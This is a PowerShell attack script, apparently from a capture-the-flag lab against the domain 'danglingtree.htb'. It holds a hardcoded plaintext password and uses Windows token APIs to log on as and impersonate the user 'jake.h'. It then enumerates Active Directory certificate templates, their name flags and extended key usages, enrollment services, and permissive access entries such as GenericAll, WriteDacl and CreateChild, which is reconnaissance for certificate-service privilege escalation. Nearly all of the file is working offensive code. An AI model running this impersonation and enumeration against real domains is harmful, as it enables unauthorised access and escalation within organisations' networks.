$ErrorActionPreference = 'Continue'
$pw = 'Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan'
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class JX3 {
  [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
  public static extern bool LogonUser(string u,string d,string p,int t,int pr,out IntPtr tok);
  [DllImport("advapi32.dll", SetLastError=true)]
  public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
    IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
  [DllImport("advapi32.dll", SetLastError=true)] public static extern bool ImpersonateLoggedOnUser(IntPtr t);
  [DllImport("advapi32.dll", SetLastError=true)] public static extern bool RevertToSelf();
  [DllImport("kernel32.dll", SetLastError=true)] public static extern bool CloseHandle(IntPtr h);
}
"@
function Impersonate-User($user,$domain,$password) {
  $tok = [IntPtr]::Zero; $dup = [IntPtr]::Zero
  # try INTERACTIVE then NETWORK then BATCH
  foreach ($lt in @(2,3,4,9)) {
    $tok = [IntPtr]::Zero
    $ok = [JX3]::LogonUser($user,$domain,$password,$lt,0,[ref]$tok)
    "LogonUser type=$lt ok=$ok err=$([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    if (-not $ok) { continue }
    # Duplicate to SecurityImpersonation (2), TokenImpersonation (2), TOKEN_ALL_ACCESS 0xF01FF
    $dup = [IntPtr]::Zero
    $dok = [JX3]::DuplicateTokenEx($tok, 0xF01FF, [IntPtr]::Zero, 2, 2, [ref]$dup)
    "  Dup ok=$dok err=$([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    if ($dok) {
      $iok = [JX3]::ImpersonateLoggedOnUser($dup)
      "  Impersonate ok=$iok err=$([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
      if ($iok) { return @{tok=$tok; dup=$dup; ok=$true} }
      [void][JX3]::CloseHandle($dup)
    }
    [void][JX3]::CloseHandle($tok)
  }
  return @{ok=$false}
}
$r = Impersonate-User 'jake.h' 'danglingtree' $pw
if (-not $r.ok) {
  "FAIL all logon types for jake"
  # fall back: also try alex for CreateProcess style later
  return
}
try {
  $id = [Security.Principal.WindowsIdentity]::GetCurrent()
  "=== $($id.Name) il=$($id.ImpersonationLevel) ==="
  whoami /groups 2>&1 | Select-String -Pattern 'Helpdesk|Template|DevOps|Cert|Admin|Interactive|Network'
  "--- templates ---"
  $tmplRoot = New-Object DirectoryServices.DirectoryEntry('LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb')
  $names = foreach ($c in $tmplRoot.Children) { [string]$c.Properties['cn'].Value }
  ($names | Sort-Object) -join ', '
  "--- published on CA ---"
  $es = New-Object DirectoryServices.DirectoryEntry('LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb')
  foreach ($ca in $es.Children) {
    $cn = [string]$ca.Properties['cn'].Value
    $pubs = @($ca.Properties['certificateTemplates'] | ForEach-Object { $_ })
    "CA=$cn"
    "PUB=$($pubs -join ',')"
  }
  "--- key templates ---"
  foreach ($n in @('User','SubCA','Machine','Administrator','ClientAuth','EmployeeAuthTemplate','VPNUserTemplate','RemoteAccessVPN','WebServer','SmartcardLogon','UserSignature')) {
    try {
      $t = New-Object DirectoryServices.DirectoryEntry("LDAP://CN=$n,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb")
      $flags = $t.Properties['msPKI-Certificate-Name-Flag'].Value
      $eku = (@($t.Properties['pKIExtendedKeyUsage']) | ForEach-Object { $_ }) -join ';'
      $enroll = ($t.ObjectSecurity.Access | Where-Object {
        $_.ActiveDirectoryRights.ToString() -match 'ExtendedRight|GenericAll|WriteDacl|WriteOwner|GenericWrite|CreateChild'
      } | ForEach-Object {
        "$($_.IdentityReference):$($_.ActiveDirectoryRights)"
      }) -join ' || '
      "TMPL=$n nameFlag=$flags"
      "  EKU=$eku"
      "  ACE=$enroll"
    } catch {
      "TMPL=$n MISSING"
    }
  }
  "--- Template_Editors on container ---"
  $tmplRoot.ObjectSecurity.Access | Where-Object {
    $_.IdentityReference -match 'Template|Helpdesk|DevOps|jake|Authenticated|Domain Users' -or
    $_.ActiveDirectoryRights.ToString() -match 'CreateChild|GenericAll|WriteDacl'
  } | ForEach-Object { "ACE $($_.IdentityReference) | $($_.ActiveDirectoryRights) | $($_.AccessControlType)" }

  "--- whoami /priv ---"
  whoami /priv 2>&1 | Select-String -Pattern 'Enabled|Se'
} finally {
  [void][JX3]::RevertToSelf()
  if ($r.dup -and $r.dup -ne [IntPtr]::Zero) { [void][JX3]::CloseHandle($r.dup) }
  if ($r.tok -and $r.tok -ne [IntPtr]::Zero) { [void][JX3]::CloseHandle($r.tok) }
}
